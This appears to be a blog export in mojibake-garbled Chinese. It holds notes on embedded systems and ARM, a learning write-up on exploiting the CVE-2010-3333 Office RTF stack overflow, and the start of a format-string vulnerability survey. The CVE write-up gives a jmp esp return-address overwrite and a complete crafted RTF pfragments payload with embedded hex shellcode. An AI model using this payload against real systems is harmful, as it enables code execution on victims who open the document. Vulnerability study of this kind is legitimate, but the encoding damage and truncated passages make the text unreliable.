¼åœ°å“åº”æ—¶é—´å’Œæ•°æ®ååé‡ï¼Œæœ€å…³é”®çš„æ˜¯èƒ½å¤Ÿç¼©å°ä½“ç§¯ä»¥åŠåŠŸèƒ½ä¸“é—¨åŒ–ï¼ŒåµŒå…¥å¼ç³»ç»Ÿç§ç±»ç¹å¤šï¼ŒæŒ‰ç…§ç³»ç»Ÿç¡¬ä»¶çš„æ ¸å¿ƒå¤„ç†å™¨æ¥è¯´å¯ä»¥åˆ†æˆåµŒå…¥å¼å¾®æ§åˆ¶å™¨å’ŒåµŒå…¥å¼å¾®å¤„ç†å™¨ã€‚ åµŒå…¥å¼å¾®æ§åˆ¶å™¨ï¼š åµŒå…¥å¼å¾®æ§åˆ¶å™¨ä¹Ÿå°±æ˜¯ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„å•ç‰‡æœºï¼Œæ˜¯ç›®å‰åµŒå…¥å¼ç³»ç»Ÿçš„å‰èº«ã€‚å•ç‰‡æœºå°±æ˜¯æŠŠä¸€ä¸ªè®¡ç®—æœºçš„ä¸»è¦åŠŸèƒ½é›†æˆåˆ°ä¸€ä¸ªèŠ¯ç‰‡ä¸Šï¼Œå³ä¸€ä¸ªèŠ¯ç‰‡å°±æ˜¯ä¸€ä¸ªè®¡ç®—æœºï¼Œä½“ç§¯å°ã€ç»“æ„ç®€å•ã€ä¾¿äºå¼€å‘ä»¥åŠä»·æ ¼ç»æµã€‚ é€šå¸¸ä¸€ä¸ªå•ç‰‡æœºèŠ¯ç‰‡åŒ…å«è¿ç®—å¤„ç†å•å…ƒã€ARMã€Flashå­˜å‚¨å™¨ä»¥åŠå¤–éƒ¨æ¥å£ï¼Œé€šè¿‡å¤–éƒ¨æ¥å£å¯ä»¥è¾“å‡ºæˆ–è€…è¾“å…¥å¿ƒå¯’ï¼Œæ§åˆ¶ç›¸åº”çš„è®¾å¤‡ï¼Œç”¨æˆ·å¯ä»¥æŠŠç¼–å†™å¥½çš„ä»£ç çƒ§å†™åˆ°å•ç‰‡æœºèŠ¯ç‰‡å†…éƒ¨æ¥æ§åˆ¶å¤–éƒ¨è®¾å¤‡ã€‚ åµŒå…¥å¼å¾®å¤„ç†å™¨ï¼š å•ç‰‡æœºå¤„ç†èƒ½åŠ›ä½ï¼ŒåµŒå…¥å¼å¾®å¤„ç†å™¨æ˜¯æœ€è¿‘å‡ å¹´éšç€å¤§è§„æ¨¡é›†æˆç”µè·¯å‘å±•åŒæ­¥ï¼Œå¤„ç†èƒ½åŠ›æ›´å¼ºï¼Œç›®å‰ä¸»æµåµŒå…¥å¼å¾®å¤„ç†å™¨éƒ½æ˜¯32ä½ï¼Œè€Œå•ç‰‡æœºå¤šæ˜¯8ä½å’Œ16ä½ã€‚ å…¸å‹åµŒå…¥å¼ç³»ç»Ÿç»„æˆï¼š åµŒå…¥å¼ç³»ç»Ÿä¸ä¼ ç»ŸPCä¸€æ ·ï¼Œä¹Ÿæ˜¯ä¸€ç§åŠè®¡ç®—æœºç³»ç»Ÿï¼Œç”±ç¡¬ä»¶å’Œè½¯ä»¶ç»„æˆï¼Œç¡¬ä»¶åŒ…æ‹¬åµŒå…¥å¼å¾®æ§åˆ¶å™¨å’Œå¾®å¤„ç†å™¨ï¼Œä»¥åŠä¸€äº›å¤–å›´å…ƒå™¨ä»¶å’Œå¤–éƒ¨è®¾å¤‡ï¼›è½¯ä»¶åŒ…æ‹¬åµŒå…¥å¼æ“ä½œç³»ç»Ÿå’Œåº”ç”¨è½¯ä»¶ã€‚ åµŒå…¥å¼ç³»ç»Ÿç§ç±»ç¹å¤šï¼Œä¸åŒçš„åµŒå…¥å¼ç³»ç»Ÿè½¯ã€ç¡¬ä»¶å¾ˆéš¾å…¼å®¹ï¼Œè½¯ä»¶å¿…é¡»ä¿®æ”¹è€Œç¡¬ä»¶å¿…é¡»é‡æ–°è®¾è®¡æ‰èƒ½ä½¿ç”¨ã€‚ å…¸å‹åµŒå…¥å¼ç³»ç»Ÿ: ç¡¬ä»¶ï¼š åµŒå…¥å¼å¤„ç†å™¨ï¼šå¤„ç†å™¨æ˜¯æ•´ä¸ªç³»ç»Ÿçš„æ ¸å¿ƒï¼Œè´Ÿè´£å¤„ç†æ‰€æœ‰çš„è½¯ä»¶ç¨‹åºä»¥åŠå¤–éƒ¨è®¾å¤‡çš„ä¿¡å· å¤–éƒ¨è®¾å¤‡ï¼šåœ¨ä¸åŒç³»ç»Ÿä¸­æœ‰ä¸åŒé€‰æ‹©ã€‚ è½¯ä»¶ï¼š åµŒå…¥å¼æ“ä½œç³»ç»Ÿï¼šæ˜¯è½¯ç¡¬ä»¶çš„æ¥å£ï¼Œè´Ÿè´£ç®¡ç†ç³»ç»Ÿçš„æ‰€æœ‰è½¯ä»¶å’Œç¡¬ä»¶èµ„æºï¼Œè¿˜å¯ä»¥é€šè¿‡é©±åŠ¨ç¨‹åºä¸å¤–éƒ¨è®¾å¤‡æ‰“äº¤é“ã€‚ åº”ç”¨è½¯ä»¶ï¼šåˆ©ç”¨æ“ä½œç³»ç»Ÿæä¾›çš„åŠŸèƒ½å¼€å‘å‡ºé’ˆå¯¹æŸä¸ªéœ€æ±‚çš„ç¨‹åºï¼Œä¾›ç”¨æˆ·ä½¿ç”¨ã€‚ 0x02 åµŒå…¥å¼è½¯ç¡¬ä»¶ç³»ç»Ÿæ•°å­—ç”µè·¯æ˜¯è®¡ç®—æœºçš„åŸºç¡€ã€‚ è¿›åˆ¶è½¬æ¢ è®¡ç®—æœºç»„æˆåŸç† ç›´æ¥å†…å­˜è®¿é—®ï¼šDMA è½¯ä»¶ï¼šç³»ç»Ÿè½¯ä»¶ã€åº”ç”¨è½¯ä»¶ è½¯ä»¶å¼€å‘ï¼šéœ€æ±‚åˆ†æã€æ¦‚è¦è®¾è®¡å’Œè¯¦ç»†è®¾è®¡ã€ç¼–ç å’Œè°ƒè¯•ã€æµ‹è¯•å’Œç»´æŠ¤ã€‚ å¸¸è§è½¯ä»¶å¼€å‘æ¨¡å‹ï¼šç€‘å¸ƒå¼€å‘æ¨¡å‹ã€å¢é‡å¼€å‘æ¨¡å‹ã€ç»Ÿä¸€è½¯ä»¶å¼€å‘æ¨¡å‹ã€‚ æ“ä½œç³»ç»Ÿçš„åŸºæœ¬ç»“æ„éƒ½æ˜¯å†…æ ¸ã€é©±åŠ¨ç¨‹åºã€ç¨‹åºåº“ã€‚ 0x03 ARMå¤„ç†å™¨ å¾®å¤„ç†å™¨ é€šç”¨å¾®å¤„ç†å™¨ï¼šç”¨äºé«˜æ€§èƒ½è®¡ç®— åµŒå…¥å¼å¾®å¤„ç†å™¨ï¼šé’ˆå¯¹æŸç§ç‰¹å®šåº”ç”¨çš„é«˜èƒ½åŠ›è®¡ç®— å¾®æ§åˆ¶å™¨ï¼šç”¨äºæ§åˆ¶æŸç§è®¾å¤‡ï¼Œé€šå¸¸é›†æˆäº†å¤šç§å¤–éƒ¨è®¾å¤‡æ§åˆ¶å™¨ï¼Œå¤„ç†æŒ‡ä»¤èƒ½åŠ›ä¸å¼ºä½†ä»·æ ¼ä½å»‰ã€‚ ARM:é«˜æ€§èƒ½RISCæœºå™¨ã€‚ èŠ¯ç‰‡ä½“ç§¯å°ï¼ŒåŠŸè€—ä½ï¼Œæˆæœ¬ä½æ€§èƒ½ä¼˜å¼‚ æ”¯æŒThumb(16ä½)å’ŒARM(32ä½) å†…éƒ¨å¤§é‡ä½¿ç”¨å¯„å­˜å™¨ï¼Œæ‰§è¡ŒæŒ‡ä»¤é€Ÿåº¦å¿«ã€‚ å¤§éƒ¨åˆ†æŒ‡ä»¤æ˜¯æ“ä½œå¯„å­˜å™¨ï¼Œå¾ˆå°‘è®¿é—®å¤–éƒ¨å†…å­˜ é‡‡ç”¨å¤šçº§æµæ°´çº¿ç»“æ„å¤„ç†é€Ÿåº¦å¿«ã€‚ å¤šç§å¯»å€æ–¹å¼ï¼Œæ•°æ®å­˜å–æ–¹å¼çµæ´» æŒ‡ä»¤é•¿åº¦å›ºå®šï¼Œä¾¿äºç¼–è¯‘å™¨æ“ä½œä»¥åŠæ‰§è¡ŒæŒ‡ä»¤ ARMæŒ‡ä»¤é›† ç®—æœ¯è¿ç®—æŒ‡ä»¤ ADD:åŠ æ³•è¿ç®— add dest,op1,op2 //destæ˜¯ç›®çš„å¯„å­˜å™¨ï¼Œop1 op2æ˜¯æ“ä½œæ•°,dest=op1+op2 ADC:å¸¦è¿›ä½åŠ æ³• ADC dest,op1,op2 SUB:å‡æ³• sub dest,op1,op2 dest=op1-op2 SBCï¼šå¸¦è¿›ä½å‡æ³• é€»è¾‘è¿ç®—æŒ‡ä»¤ AND:é€»è¾‘ä¸(1 1ä¸º1ï¼Œ0 0ä¸º1ï¼Œ1 0ä¸º0) and dest,op1,op2 dest=op1 and op2 EOR:å¼‚æˆ–ï¼ˆ1 1ä¸º0ï¼Œ0 0ä¸º0ï¼Œ10ä¸º1ï¼‰ MOV:å¤åˆ¶æ•°æ® mov dest,op1 dest=op1 mov r0,r0,LSL#3//r0=r0*8,LSLå¯„å­˜å™¨å·¦ç§»ä¸‰ä½ï¼Œå³ä¹˜ä»¥8 åˆ†æ”¯æŒ‡ä»¤ B:è·³è½¬ b åœ°å€ //è·³è½¬åˆ°æŒ‡å®šåœ°å€ æ•°æ®ä¼ é€æŒ‡ä»¤ å•ä¸€æ•°æ®ä¼ é€æŒ‡ä»¤ï¼šå‘å†…å­˜è£…è½½å’Œå­˜å‚¨ä¸€ä¸ªå­—èŠ‚æˆ–ä¸€ä¸ªå­—é•¿çš„æ•°æ® LDR Rd,åœ°å€ STR Rd,åœ°å€ LDR B Rd,åœ°å€ STR B Rd,åœ°å€ å¤šæ•°æ®ä¼ é€æŒ‡ä»¤ï¼šå‘å†…å­˜è£…è½½å’Œå­˜å‚¨å¤šä¸ªå­—èŠ‚æˆ–å­—çš„æ•°æ® xxM Rn(!),&lt;å¯„å­˜å™¨åˆ—è¡¨&gt;{^} xx:LDâ€“è£…è½½ï¼ŒSTâ€“å­˜å‚¨ LDMED LDMIB//++i LDMFD LDMIA//i++ LDMEA LDMDB//++*i LDMFA LDMDA//*i++ STMFA STMIB//å­˜å‚¨å‰å¢åŠ åœ°å€ STMEA STMIA//å­˜å‚¨åå¢åŠ åœ°å€ STMFD STMDB//å­˜å‚¨å‰å¢åŠ å€¼ STMED STMDA//å­˜å‚¨åå¢åŠ å€¼ ARMçŠ¶æ€ï¼š0ä½è¡¨ç¤ºARMçŠ¶æ€ï¼Œ1ä½è¡¨ç¤ºThumbçŠ¶æ€,BXæŒ‡ä»¤åˆ‡æ¢çŠ¶æ€ã€‚ MMU:å†…å­˜ç®¡ç†å•å…ƒã€‚ LSL:é€»è¾‘å·¦ç§»ï¼ŒäºŒè¿›åˆ¶ä»å³å¾€å·¦ç§»åŠ¨ï¼Œç©ºä½è¡¥0ï¼ˆå°±æ˜¯åŸæ•°å€¼ä¹˜ä»¥2çš„ç§»ä½æ¬¡æ–¹ï¼‰LSR:é€»è¾‘å³ç§»ï¼ŒäºŒè¿›åˆ¶ä»å·¦å¾€å³ï¼Œç©ºä½è¡¥0ASR:ç®—æœ¯å³ç§»ï¼Œç¬¦å·ä½ä¸å˜ï¼Œé«˜ä½ç©ºå‡ºè¡¥0ï¼Œä½ä½è¡¥1ROR:å¾ªç¯å³ç§»ï¼Œä½ä½ç§»åˆ°é«˜ä½RRX:å¸¦æ‰©å±•çš„å¾ªç¯å³ç§»ï¼šæ“ä½œæ•°å³ç§»ä¸€ä½ï¼Œé«˜ç«¯ç©ºå‡ºä½ç”¨åŸCæ ‡å¿—å€¼å¡«å…… å¯»å€æ–¹å¼ ç«‹å³å¯»å€:ç”¨#è¡¨ç¤ºæ•°å€¼ subs r0,#1;r0=r0-1 mov r0,#0xff00;r0=0xff00 å¯„å­˜å™¨å¯»å€æ–¹å¼ï¼šè¯»å–å¯„å­˜å™¨å¾—åˆ°æ“ä½œæ•° mov r1,r2;r1=r2 sub r0,r1,r2;r0=r1-r2 å¯„å­˜å™¨åç§»å¯»å€ï¼šå¯„å­˜å™¨çš„å€¼ç§»ä½å¾—ç»“æœ mov r0,r1,LSL #3;r0=r1*8 ands r0,r2,LSL #3;r0= r2*8 and r1 å¯„å­˜å™¨é—´æ¥å¯»å€ï¼šå¯„å­˜å™¨ä¸ºåœ°å€ï¼Œä»å¯¹åº”å†…å­˜é‡å–å‡ºæ•°æ® LDR r0,[r1];r1ä¸ºåœ°å€ï¼Œä»å†…å­˜ä¸­å–å‡ºæ•°æ®å­˜å…¥r0 SWP r0,r0,[r1];r1ä¸ºåœ°å€ï¼Œä»å†…å­˜ä¸­å–å‡ºæ•°æ®ä¸r0äº¤æ¢ åŸºå€å¯»å€ï¼šæŠŠå¯„å­˜å™¨å†…å®¹ä¸æŒ‡å®šä¾¿å®œç›¸åŠ ï¼Œå¾—æ•°æ®åœ°å€ï¼Œåä»å†…å­˜ä¸­å–å‡ºæ•°æ® LDR r0,[r1,#0xf];r1æ•°å€¼ä¸0xfç›¸åŠ å¾—åˆ°æ•°æ®åœ°å€ STR r0,[r1,#-2];r1æ•°å€¼-2å¾—åˆ°æ•°æ®åœ°å€ å¤šå¯„å­˜å™¨å¯»å€ï¼šä¸€æ¬¡ä¼ è¾“å¤šä¸ªå¯„å­˜å™¨å€¼ LDMIA r1!,{r2r7,r12};r1å•å…ƒé‡æ•°æ®è¯»åˆ°r2r7å’Œr12,r1æŒ‡å®šåœ°å€è‡ªåŠ¨åŠ 1 æ ˆå¯»å€ï¼šå…ˆè¿›åå‡ºï¼Œé€šè¿‡æ ˆæŒ‡é’ˆå¯„å­˜å™¨å¯»å€ STMFD SP!,{R0R7,LR};r0r7å’ŒLRçš„å†…å®¹å‹å…¥å †æ ˆ LDMFD SP!,{r0r7,LR};ä»å †æ ˆä¸­å–å‡ºæ•°æ®åˆ°r0r7å’ŒLR 0x04 åµŒå…¥å¼Linuxä¸€èˆ¬æ¥è¯´ï¼ŒåµŒå…¥å¼æ“ä½œç³»ç»Ÿæ˜¯ç”±å¯åŠ¨ç¨‹åºã€æ ¸å¿ƒã€æ ¹æ–‡ä»¶ç³»ç»Ÿç»„æˆï¼Œé€šè¿‡ç‰¹æ®Šçš„çƒ§å½•å·¥å…·å°†ç¼–è¯‘å¥½çš„åµŒå…¥å¼ç³»ç»Ÿæ–‡ä»¶å½±åƒçƒ§å†™åˆ°ç›®æ ‡æ¿çš„åªè¯»å­˜å‚¨å™¨ï¼ˆROMï¼‰æˆ–Flashå­˜å‚¨å™¨ä¸­ã€‚ 0x05 å»ºç«‹è½¯ä»¶å¼€å‘ç¯å¢ƒ è¿è¡Œåœ¨windowså¹³å°ä¸‹å¾—åˆ°Linuxç³»ç»Ÿæ¨¡æ‹Ÿç¯å¢ƒï¼šCygwin. linuxä¸‹ï¼šä¸²å£å·¥å…·minicom windowsä¸‹ï¼šä¸²å£å·¥å…·xshell ARMé›†æˆå¼€å‘ç¯å¢ƒADS cè¯­è¨€ç¼–è¯‘å™¨armcc c++è¯­è¨€ç¼–è¯‘å™¨armcpp 0x06 ç¬¬ä¸€ä¸ªlinuxåº”ç”¨ç¨‹åº viåˆ›å»ºæºä»£ç æ–‡ä»¶hello.c gcc -c hello.c ç¼–è¯‘è¿è¡Œ 0x07 Linuxåº”ç”¨ç¨‹åºç¼–ç¨‹åŸºç¡€ å †æ ˆ å†…å­˜ç®¡ç†å‡½æ•° malloc():åˆ†é…å†…å­˜ï¼Œä¸èƒ½åˆå§‹åŒ–å†…å­˜ç©ºé—´ free()ï¼šé‡Šæ”¾malloc()åˆ†é…çš„å†…å­˜ å®ç”¨çš„å†…å­˜åˆ†é…å‡½æ•° calloc():åˆ†é…ä¸€å—æ–°å†…å­˜ï¼Œå‘åº”ç”¨ç¨‹åºåˆ†è¯¶å†…å­˜ï¼Œåˆ†é…åä¼šåˆå§‹åŒ–æ–°åˆ†é…çš„å†…å­˜ç©ºé—´ realloc():æ”¹å˜ä¸€å—å·²ç»åˆ†é…çš„å†…å­˜å¤§å°ï¼Œå‡½æ•°è°ƒæ•´åçš„å†…å­˜ç©ºé—´èµ·å§‹åœ°å€æœ‰å¯èƒ½ä¸åŸæ¥çš„ä¸åŒï¼Œæ‰€ä»¥éœ€è¦realloc()å‡½æ•°çš„è¿”å›å€¼ã€‚ æ–‡ä»¶æŒ‡é’ˆå’Œæµï¼šFILE*fp getc() /fgetc() /getchar() POSIXæ–‡ä»¶I/Oç¼–ç¨‹ POSIXå¯ç§»æ¤æ“ä½œç³»ç»Ÿæ¥å£ open() /creat() /close() /read() /write() /fcnt()ä¿®æ”¹ä¸€æ‰“å¼€æ–‡ä»¶å±æ€§ æ–‡ä»¶å¤´ï¼š &lt;sys/types.h&gt; &lt;sys/stat.h&gt; &lt;fcntl.h&gt; 0x08 å¼€å‘å¤šè¿›ç¨‹/çº¿ç¨‹ç¨‹åº PCBè¿›ç¨‹æ§åˆ¶å— fork()è°ƒç”¨åˆ›å»ºè¿›ç¨‹ é€€å‡ºè¿›ç¨‹ï¼šexit()ã€_exit()ã€atexit()ã€on_exit(). å¸¸ç”¨è¿›ç¨‹é—´é€šä¿¡æ–¹æ³•ï¼š ç®¡é“ï¼šå•æ–¹å‘ä¼ é€æ•°æ®ï¼Œåªèƒ½åœ¨æœ‰å…±åŒçˆ¶è¿›ç¨‹çš„è¿›ç¨‹é—´ä½¿ç”¨ pipe()å‡½æ•°ï¼šåˆ›å»ºç®¡é“ #include&lt;unistd.h&gt; int pipe(int filedes[1]); å…±äº«å†…å­˜ï¼šä¸åŒè¿›ç¨‹å¯è®¿é—® int shmget():åˆ›å»º void *shmatï¼šè·å¾—ä¸€ä¸ªå…±äº«å†…å­˜IDå¯¹åº”çš„å†…å­˜å…¶å®åœ°å€ int shmdtï¼šä»ç¨‹åºä¸­åˆ†ç«‹ä¸€å—å…±äº«å†…å­˜ FIFO æ¶ˆæ¯é˜Ÿåˆ— ä¿¡å·é‡ å…±äº«å­˜å‚¨ socker Linuxçš„å¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹ 0x09 ç½‘ç»œé€šä¿¡åº”ç”¨ TCP/IPåè®®ç°‡ IPåè®®ï¼šåœ¨ä¼ è¾“å±‚ï¼Œè´Ÿè´£æ•°æ®åŒ…çš„ä¼ è¾“ç®¡ç† å®ç°ä¸¤ä¸ªåŠŸèƒ½ï¼šå¯»å€å’Œåˆ†æ®µ","categories":[],"tags":[{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"æ¼æ´æˆ˜äº‰å­¦ä¹ ç¬”è®°2ï¼šCVE-2010-3333","slug":"æ¼æ´æˆ˜äº‰å­¦ä¹ ç¬”è®°2ï¼šCVE-2010-3333","date":"2022-08-09T03:17:04.198Z","updated":"2022-08-09T04:19:33.523Z","comments":true,"path":"2022/08/09/æ¼æ´æˆ˜äº‰å­¦ä¹ ç¬”è®°2ï¼šCVE-2010-3333/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/","excerpt":"","text":"0x01 åˆ†æç¯å¢ƒos:ç”±äºç¬”è€…å®åœ¨æ²¡æœ‰æ‰¾åˆ°å¤§ä½¬ä»¬ä½¿ç”¨çš„ç›®æ ‡æ–‡ä»¶office word 2003 11.5604.5606,åªæœ‰11.8169.8172ï¼Œä½†æ˜¯åº”è¯¥åªè¦æ˜¯2003 sp3çš„åº”è¯¥å°±é—®é¢˜ä¸å¤§ã€‚ æ“ä½œç³»ç»Ÿï¼šwindows XP SP3è™šæ‹Ÿæœºï¼šVMè°ƒè¯•å™¨ï¼šWinDbgã€ODã€IDAoffice:office word 2003 11.8169.8172 0x02 æ¼æ´æè¿°oddice xp sp3ã€2003 sp3ã€2007 sp2ã€2010ç­‰å¤šä¸ªç‰ˆæœ¬çš„officeè½¯ä»¶ä¸­çš„Open XMLæ–‡ä»¶æ ¼å¼è½¬æ¢å™¨å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œä¸»è¦æ˜¯åœ¨å¤„ç†RTFçš„â€pFragmentsâ€å±æ€§æ—¶å­˜åœ¨æ ˆæº¢å‡ºï¼Œå¯¼è‡´è¿œç¨‹æ”»å‡»è€…å¯ä»¥å€ŸåŠ©ç‰¹åˆ¶çš„RTFæ•°æ®æ‰§è¡Œä»»æ„ä»£ç ï¼Œå› æ­¤è¯¥æ¼æ´åˆåâ€RTFæ ˆç¼“å†²åŒºæº¢å‡ºæ¼æ´â€ã€‚ office word 2003ä¸­çš„MSO.dllåº“åœ¨è§£æRTFæ–‡æ¡£çš„ç»˜å›¾pFRagmentså±æ€§æ—¶å®Œå…¨ä¿¡ä»»å…¶æ•°æ®ï¼Œæœªåšä»»ä½•æ£€æŸ¥ä¾¿å°†æ•°æ®å¤åˆ¶åˆ°æ ˆä¸­ï¼Œå­˜åœ¨äº†æ ˆæº¢å‡ºçš„å¯èƒ½ï¼Œå¯¼è‡´ç”¨æˆ·æ‰“å¼€ç²¾å¿ƒæ„é€ çš„RTFæ–‡ä»¶æ—¶å°±æœ‰å¯èƒ½å¯¼è‡´æ‰§è¡Œä»»æ„ä»£ç ã€‚ 0x03 åˆ†æè¿‡ç¨‹ç”¨Metasploitç”Ÿæˆæµ‹è¯•æ ·æœ¬msf.rtfã€‚ è¿è¡ŒWinDbgé™„åŠ Word 2003ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½æ˜¯è¿˜æ²¡æœ‰æ‰“å¼€æµ‹è¯•æ ·æœ¬çš„æ—¶å€™ï¼Œwindbgå°±å·²ç»æŠ¥é”™äº†ï¼Œæˆ‘è£‚å¼€äº†å‘€ã€‚ç„¶åçœ‹æŠ¥é”™æ˜¯ntdll.dllæ–‡ä»¶ç¬¦å·æ–‡ä»¶æ— æ³•æ‰¾åˆ°ï¼Œé‚£æˆ‘ä¸‹è½½ä¸€ä¸ªå¼„ï¼Œç»“æœå¹¶æ²¡æœ‰ç¼ºå¤±ï¼Œæˆ‘åˆè£‚å¼€äº†ï¼ [å¾…ç»­] æ‰“å¼€æµ‹è¯•æ ·æœ¬ï¼ŒWinDbgæ•è·å¼‚å¸¸ï¼Œå¾ªç¯èµ‹å€¼å†…å­˜æ•°æ®åˆ°æ ˆç©ºé—´æ—¶ï¼Œæœªæ£€æµ‹å¤åˆ¶çš„å†…å­˜å¤§å°ï¼Œå¯¼è‡´è¦†ç›–åˆ°ediï¼ˆ0x130000ï¼‰å¼€å§‹çš„ä¸å¯å†™é¡µé¢,è§¦å‘å¼‚å¸¸çš„æŒ‡ä»¤ä½äº30e9eb88,å½“å‰æ ˆå·²è¢«æ ·æœ¬ç”Ÿæˆçš„åƒåœ¾æ•°æ®è¦†ç›–ã€‚ g kb åœ¨30e9eb88å¤„ä¸‹æ–­ï¼Œé‡æ–°æ‰“å¼€æµ‹è¯•æ ·æœ¬ï¼Œæ–­ä¸‹æ¥åé€šè¿‡kbæŒ‡ä»¤å¾—åˆ°çš„ä¿¡æ¯è¿›è¡Œå›æº¯ï¼Œç»“åˆIDAï¼Œå¯çŸ¥è°ƒç”¨å‡½æ•°åŠå…¶æ‰§è¡Œæµç¨‹ï¼š30f4cc5d-&gt;30f4cc93 call 30e9eb62-&gt;30e9eb88 é€šè¿‡è·Ÿè¸ªåˆ†æå¯å‘ç°ï¼Œå¤åˆ¶çš„æ•°æ®å¤§å°ç”±æ ·æœ¬ä¸­çš„æŸä¸€å¤„å†³å®šï¼Œå¦‚ä¸‹é¢ä¸¤å¼ å›¾ï¼Œå‰é¢çš„4åœ¨åé¢çš„è®¡ç®—ä¸­ä¼šå˜æˆ0ï¼Œå¹¶ä¸”å°†c8acé™¤ä»¥4ï¼ˆå› ä¸ºæ“ä½œçš„å¤§å°ä¸ºDWORD p ä¸ºäº†ç¡®å®šè¯¥æ ˆæº¢å‡ºæ¼æ´èƒ½åŠ«æŒç¨‹åºè¿è¡Œæµç¨‹ï¼Œè‡ªå·±æ„é€ ä¸€ä¸ªé•¿åº¦åå°ï¼ˆé˜²æ­¢è§¦å‘è®¿é—®å¼‚å¸¸ï¼‰ä½†åˆèƒ½è¦†ç›–è¿”å›åœ°å€çš„æµ‹è¯•æ ·æœ¬, æ‰“å¼€è¯¥æ ·æœ¬ï¼ŒWinDbgæ•è·å¼‚å¸¸ï¼Œeipå·²è¢«æ”¹ä¸º111111ï¼Œè‡³æ­¤æˆ‘ä»¬å¯ä»¥ç¡®å®šè¯¥æ ˆæº¢å‡ºæ¼æ´å¯è¢«åˆ©ç”¨ 0x04 æ¼æ´åˆ©ç”¨è¦†ç›–è¿”å›åœ°å€æ‰¾åˆ°è¦†ç›–æˆè¿”å›åœ°å€çš„åœ°æ–¹ï¼Œä¿®æ”¹æˆ0x7ffa4512ï¼ˆjmp espï¼‰ï¼Œå†åœ¨åé¢æ·»åŠ ä¸€äº›0x90ï¼Œç„¶åè¿è¡Œèµ·æ¥è¿˜æ²¡åˆ°æ‰§è¡Œåˆ°æ ˆä¸­å°±ä¼šå´©æºƒï¼Œæ¨æµ‹å‰é¢æµ‹è¯•æ ·æœ¬å¤ªå°æ²¡æ€ä¹ˆæ±¡æŸ“åˆ°æ ˆç©ºé—´ï¼Œä¸€å¼€å§‹è¿˜æƒ³ç€è¿˜åŸæ ˆç©ºé—´ï¼Œä½†æ˜¯é‡æ–°åˆ†æäº†æµ‹è¯•æ ·æœ¬åå‘ç°å…¶åœ¨ä¸‹å›¾ä¸­30F4CB29å¤„æ˜¯å®ç°è·³è½¬çš„ï¼Œè€ŒåŠ äº†ä¸€äº›0x90åä¸è·³è½¬ï¼Œå¹¶è¿›è¡Œäº†ä¸€äº›ä¸æ ˆç›¸å…³çš„æ“ä½œï¼Œä»è€Œå¯¼è‡´å´©æºƒ å¸ƒç½®shellcodeåˆ†æäº†ä¸‹ï¼Œæ˜¯æ ˆä¸­å¤šäº†ä¸€äº›0x90å¯¼è‡´åŸæ¥çš„ä¸€å †00ä¸è§äº†ï¼Œæ‰€ä»¥éœ€è¦åœ¨è¿”å›åœ°å€åé¢åŠ 40ä¸ª00ï¼Œè¿™æ ·å°±å¯ä»¥æ‰§è¡Œåˆ°æ ˆä¸­äº†ã€‚åœ¨åé¢åŠ å…¥shellcodeï¼Œé‡æ–°è¿è¡Œå¹¶æˆåŠŸè¿›å…¥shellcodeï¼Œå¸ƒç½®shellcodeå¦‚ä¸‹ï¼š z{\\rtf1{}{\\shp{*\\shpinst{\\sp{\\sn pfragments}{\\sv1;1;11111111111111111111111111111111111111111111111111111245fa7f0000000000000000000000000000000000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db536875730000687267656f68524e476f8bc453505053ff57fc53ff57f8}}}}}```","categories":[],"tags":[{"name":"æ¼æ´æˆ˜äº‰","slug":"æ¼æ´æˆ˜äº‰","permalink":"https://sinky.top/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/"}]},{"title":"å„ç±»å‹è½¯ä»¶æ¼æ´åˆé›†","slug":"ç±»å‹æ¼æ´åˆé›†","date":"2022-08-09T03:17:04.198Z","updated":"2022-08-09T04:18:23.849Z","comments":true,"path":"2022/08/09/ç±»å‹æ¼æ´åˆé›†/","link":"","permalink":"https://sinky.top/2022/08/09/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/","excerpt":"","text":"0x01 æ ¼å¼åŒ–ä¸²æ¼æ´ä»‹ç»æ ¼å¼åŒ–ä¸²æ¼æ´äº§ç”Ÿäºæ•°æ®è¾“å‡ºå‡½æ•°ä¸­å¯¹è¾“å‡ºæ ¼å¼è§£æçš„ç¼ºé™·ã€‚å½“è¾“å…¥è¾“å‡ºå‡½æ•°çš„æ ¼å¼æ§åˆ¶ç¬¦èƒ½å¤Ÿè¢«å¤–ç•Œå½±å“æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯»å†™å†…å­˜çš„æ–¹æ³•ä¿®æ”¹å‡½æ•°è¿”å›åœ°å€ï¼ŒåŠ«æŒè¿›ç¨‹ï¼Œä½¿shellcoedå¾—åˆ°æ‰§è¡Œã€‚ æ­¤ç±»æ¼æ´å‘ç”Ÿæ¡ä»¶è‹›åˆ»ï¼Œå®é™…æ¡ˆä¾‹å¾ˆå°‘ã€‚ èƒ½å¤Ÿå¼•èµ·æ­¤æ¼æ´çš„å‡½æ•°1234567891011int printf(const char* format [,argument]...);int wprintf(const wchar_t* format [,argument]...);int fwprintf(FILE* stream,const wchar_t* format [,argument]...);int sprintf(char buffer,const char* format [,argument]...);int swprintf(wchar_t *buffer,const wchar_t *format [,argument]...);int vprintf(const char* format,va_list argptr );int vwprintf(const wchar_t* format,va_list argptr );int vfprintf(FILE *stream,const char* format,va_list argptr );int vfwprintf(FILE *stream,const wchar_t* format,va_list argptr );int vsprintf(char *buffer,const char* format,va_list argptr );int vswprintf(wchar_t *buffer,const wchar_t* format,va_list argptr ); 0x02 